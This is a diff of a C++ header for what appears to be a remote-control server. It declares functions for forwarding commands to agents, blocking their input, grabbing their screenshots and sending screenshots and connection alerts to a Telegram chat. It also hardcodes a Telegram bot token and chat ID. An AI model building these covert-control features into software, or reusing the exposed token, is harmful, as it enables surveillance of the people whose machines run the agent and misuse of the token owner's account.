@@ -6,12 +6,18 @@
 #include <atomic>
 #include <memory>
 #include <thread>
+#include "../common/protocol.h"
+
+// Telegram Bot настройки
+constexpr const char* TELEGRAM_BOT_TOKEN = "8065226839:AAERJflS62GG5CDzHiUS-eaa3maCW4w7VU4";
+constexpr const char* TELEGRAM_CHAT_ID = "392046128";
 
 struct ConnectedAgent {
     int socket;
     std::string id;
     std::string name;
     std::string os;
+    std::string ip;
     bool online;
     std::mutex socket_mutex;
 };
@@ -33,7 +39,7 @@ public:
 
 private:
     void acceptConnections();
-    void handleConnection(int client_socket);
+    void handleConnection(int client_socket, const std::string& client_ip);
     void handleAgent(int client_socket, const std::string& agent_id);
     void handleAdmin(int client_socket);
     
@@ -47,6 +53,19 @@ private:
     
     // Пересылка команды агенту
     bool forwardCommandToAgent(const std::string& agent_id, const std::string& command, std::string& response);
+    
+    // Пересылка команды блокировки/разблокировки ввода
+    bool forwardInputCommand(const std::string& agent_id, RemoteProto::MessageType cmd_type,
+                             RemoteProto::MessageType& response_type, std::string& response);
+    
+    // Telegram уведомления
+    void sendTelegramNotification(const std::string& message);
+    void sendTelegramPhoto(const std::vector<uint8_t>& photo_data, const std::string& caption);
+    void notifyAgentConnected(const std::string& name, const std::string& os, const std::string& ip);
+    void notifyAgentDisconnected(const std::string& name);
+    
+    // Скриншот
+    bool forwardScreenshotRequest(const std::string& agent_id, std::vector<uint8_t>& screenshot_data);
 
     uint16_t m_port;
     std::string m_admin_token;
